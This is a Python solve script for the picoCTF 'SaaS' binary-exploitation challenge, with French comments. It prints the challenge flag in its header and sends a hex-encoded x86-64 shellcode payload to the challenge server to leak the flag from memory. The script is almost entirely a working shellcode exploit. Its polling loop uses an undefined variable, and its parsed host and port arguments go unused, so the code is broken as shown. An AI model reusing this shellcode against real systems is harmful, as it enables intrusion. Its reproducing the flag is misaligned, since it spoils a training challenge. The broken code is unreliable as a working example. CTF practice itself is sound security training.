# 213 - SaaS  (Binary Exploitation, picoMini by redpwn)
# Flag: picoCTF{f0ll0w_th3_m4p_t0_g3t_th3_fl4g}
# Write-up: ../../../writeups/binary-exploitation/213-saas.md
# Script exact utilise pour produire le flag.
#
import sys, json, re, time, socket

# Service : demarrer l'instance depuis la plateforme du challenge, puis passer
# l'hote et le port (ou l'URL) en argument de ce script.
_A = sys.argv[1:]
HOST = _A[0] if len(_A) > 0 else ""
PORT = int(_A[1]) if len(_A) > 1 else 0
url = _A[0] if _A else ""

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

host = port = None
for _ in range(12):
    time.sleep(2)
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"([A-Za-z0-9][A-Za-z0-9.\-]*\.net)\s+`?(\d{4,5})", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
sc = bytes.fromhex("4889e341bc00400000488b034883f8037511488b4b084883e9408b013d7f454c4674154883c31049ffcc75ddb83c000000bf000000000f05488db160202000b801000000bf01000000ba640000000f05b83c0000004831ff0f05")
print("shellcode:", len(sc))
s = socket.create_connection((host, port), timeout=15)
s.settimeout(8)
time.sleep(0.3)
try:
    print("banner:", s.recv(200))
except Exception:
    pass
s.sendall(sc)
out = b""
t0 = time.time()
while time.time() - t0 < 8:
    try:
        c = s.recv(8192)
        if not c:
            break
        out += c
    except socket.timeout:
        break
s.close()
print("=== sortie ===")
print(out[:400])
m = re.search(rb"(?:academy|picoCTF)\{[^}]*\}", out)
print("FLAG:", m.group(0).decode() if m else None)
